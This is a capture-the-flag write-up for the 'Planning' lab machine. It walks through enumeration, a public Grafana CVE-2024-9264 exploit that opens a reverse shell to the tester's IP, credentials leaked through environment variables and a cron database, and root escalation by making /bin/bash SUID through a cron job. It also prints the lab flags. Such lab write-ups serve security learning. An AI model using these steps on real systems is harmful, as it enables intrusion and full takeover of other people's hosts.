# CTF Writeup: Planning

## Lab Description

`Planning` is an easy difficulty Linux machine that features web enumeration, subdomain fuzzing, and exploitation of a vulnerable `Grafana` instance to [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264). After gaining initial access to a Docker container, an exposed password enables lateral movement to the host system due to password reuse. Finally, a custom cron management application with `root` privileges can be leveraged to achieve full system compromise. 

Credentials provided by the box admin:0D5oT70Fq13EvB5r
---

## Reconaissance

An initial scan revealed following information:


```
nmap -sCV --min-rate 10000 -p- 10.129.86.59
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 12:42 EDT
Warning: 10.129.86.59 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.86.59
Host is up (0.029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp    open     http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
30026/tcp filtered unknown
49921/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.20 seconds
```

Since only ssh and http is open, I'm assuming that we need to find initial access through http.
Since we couldn't get redirected to the domain http://planning.htb/ we will have to map the domain to our ip.

```
sudo echo "10.129.86.59 planning.htb" | sudo tee -a /etc/hosts
```

The website seems to be an education course website.

Since the labdescription seems to be hinting at fuzzing, I decided to first run feroxbuster to enumerate endpoints.

```
feroxbuster -u http://planning.htb/                
                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.12.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://planning.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.12.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://planning.htb/js => http://planning.htb/js/
301      GET        7l       12w      178c http://planning.htb/css => http://planning.htb/css/
301      GET        7l       12w      178c http://planning.htb/img => http://planning.htb/img/
301      GET        7l       12w      178c http://planning.htb/lib => http://planning.htb/lib/
200      GET        1l       38w     2303c http://planning.htb/lib/easing/easing.min.js
200      GET       11l       56w     2406c http://planning.htb/lib/counterup/counterup.min.js
200      GET      194l      674w    10229c http://planning.htb/course.php
200      GET      230l      874w    12727c http://planning.htb/about.php
200      GET       21l      212w    20494c http://planning.htb/img/team-3.jpg
200      GET      137l      234w     3338c http://planning.htb/js/main.js
200      GET        8l       58w     5269c http://planning.htb/img/testimonial-1.jpg
200      GET        5l       89w     5527c http://planning.htb/img/testimonial-2.jpg
200      GET        7l      158w     9028c http://planning.htb/lib/waypoints/waypoints.min.js
200      GET      201l      663w    10632c http://planning.htb/contact.php
200      GET      220l      880w    13006c http://planning.htb/detail.php
200      GET        6l       64w     2936c http://planning.htb/lib/owlcarousel/assets/owl.carousel.min.css
200      GET       60l      404w    29126c http://planning.htb/img/team-2.jpg
200      GET       63l      389w    30916c http://planning.htb/img/team-1.jpg
200      GET      128l      607w    48746c http://planning.htb/img/courses-2.jpg
200      GET      146l      790w    75209c http://planning.htb/img/feature.jpg
200      GET      173l      851w    64663c http://planning.htb/img/courses-1.jpg
200      GET        7l      279w    42766c http://planning.htb/lib/owlcarousel/owl.carousel.min.js
403      GET        7l       10w      162c http://planning.htb/lib/easing/
200      GET      136l      656w    53333c http://planning.htb/img/courses-3.jpg
403      GET        7l       10w      162c http://planning.htb/lib/waypoints/
403      GET        7l       10w      162c http://planning.htb/lib/owlcarousel/assets/
403      GET        7l       10w      162c http://planning.htb/lib/owlcarousel/
301      GET        7l       12w      178c http://planning.htb/lib/owlcarousel/assets => http://planning.htb/lib/owlcarousel/assets/
200      GET      420l     1623w    23914c http://planning.htb/index.php
200      GET      103l      772w    55609c http://planning.htb/img/about.jpg
403      GET        7l       10w      162c http://planning.htb/lib/counterup/
200      GET     9966l    19218w   183895c http://planning.htb/css/style.css
200      GET      420l     1623w    23914c http://planning.htb/
200      GET       23l      172w     1090c http://planning.htb/lib/owlcarousel/LICENSE
[####################] - 47s   300032/300032  0s      found:34      errors:118    
[####################] - 46s    30000/30000   650/s   http://planning.htb/ 
[####################] - 46s    30000/30000   654/s   http://planning.htb/js/ 
[####################] - 46s    30000/30000   654/s   http://planning.htb/css/ 
[####################] - 46s    30000/30000   654/s   http://planning.htb/img/ 
[####################] - 46s    30000/30000   654/s   http://planning.htb/lib/ 
[####################] - 46s    30000/30000   655/s   http://planning.htb/lib/owlcarousel/assets/ 
[####################] - 46s    30000/30000   655/s   http://planning.htb/lib/easing/ 
[####################] - 46s    30000/30000   655/s   http://planning.htb/lib/owlcarousel/ 
[####################] - 46s    30000/30000   655/s   http://planning.htb/lib/waypoints/ 
[####################] - 46s    30000/30000   655/s   http://planning.htb/lib/counterup/
```

We got a /lib directory with some interesting endpoints.
Also ran ffuf to enumerate subdomains, since an grafana dashboard is mentioned i'm assuming it's hosted on a subdomain.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb/ -H "Host: FUZZ.planning.htb" -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 29ms]
:: Progress: [100000/100000] :: Job [1/1] :: 1818 req/sec :: Duration: [0:00:59] :: Errors: 0 ::
```

My guess was correct, let's analyze the grafana dashboard.
Mapped grafana.planning.htb subdomain in /etc/hosts.
It prompted us with an login page. Further analysation of the grafana subdomain, 
provides us with the version Grafana v11.0.0.

Found an exploit PoC

```
https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit
```

Downloaded the PoC locally, before we are able to run the exploit, we will need to install some archives.
In order to install those archives, we will need to start up an environment.

```
python3 -m venv myenv
```
```
source myenv/bin/activate
```



```
pip install ten
```


```
pip install psycopg2-binary
```


## Initial Access 

Started up listener utilizing netcat on port 1337 on my local machine.


```
nc -lvnp 1337
```

Ran the initial exploit and gained RCE as root, but in an docker environment


```
python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.53 --reverse-port 1337
```

```
nc -lvnp 1337                   
listening on [any] 1337 ...
connect to [10.10.14.53] from (UNKNOWN) [10.129.86.59] 43562
sh: 0: can't access tty; job control turned off
#
```

Running the "env" command will provide us with more information about the docker container itself, there is a misconfig
exposed, we gained credentials from an user called "enzo:RioTecRANDEntANT!"

```
env
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
AWS_AUTH_EXTERNAL_ID=
SHLVL=1
HOME=/usr/share/grafana
OLDPWD=/
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
_=hostname
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/root

```

Logged into ssh with the credentials.

```
ssh enzo@planning.htb              
The authenticity of host 'planning.htb (10.129.86.59)' can't be established.
ED25519 key fingerprint is SHA256:iDzE/TIlpufckTmVF0INRVDXUEu/k2y3KbqA/NDvRXw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'planning.htb' (ED25519) to the list of known hosts.
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Oct  6 06:56:16 PM UTC 2025

  System load:  0.0               Processes:             230
  Usage of /:   77.9% of 6.30GB   Users logged in:       0
  Memory usage: 48%               IPv4 address for eth0: 10.129.86.59
  Swap usage:   4%


Expanded Security Maintenance for Applications is not enabled.

102 updates can be applied immediately.
77 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Mon Oct 6 18:56:18 2025 from 10.10.14.53
enzo@planning:~$
```

Retrieved user.txt in /home/enzo

```
0ba45ce0a18408460bdab840af458963
```

## Privilege Escalation

Since the lab description gave us the information about an custom mod running on the server, I will try to enumerate running services first.


```
netstat -tulnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44891         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

All ports besides 3000 and 8000 are known, I'm assuming port 3000 runs the grafana dashboard.

So next initiative is to further analyze the running service on port 8000, to be able to do this, we will have to perform portforwading on our local machine.

```
ssh enzo@planning.htb -L 8000:127.0.0.1:8000
```

It prompts us for login credentials, but our current credentials don't seem to work.
In the /opt directory we find an interesting folder called crontabs. Further inspecting this folder will give us an .db file, in which we can retrieve new credentials. root:P4ssw0rdS0pRi0T3c

```
cat crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

Succesfully logged into the dashboard.
We have the option to create a new cronjob (which runs with root privs), decided to entry the command chmod u+s /bin/bash, to modify the bash binary to make it an SUID Binary, so we can run it with enzo user.

```
chmod u+s /bin/bash
```

Now our bash binary has SUID rights, the following command can be ran in order to get root shell.

```
bash -p
```


```
bash -p
bash-5.2# whoami
root
```

Retrieved root.txt in /root directory.

```
1d155bb41b65d37edea0dc684c9fc484
```
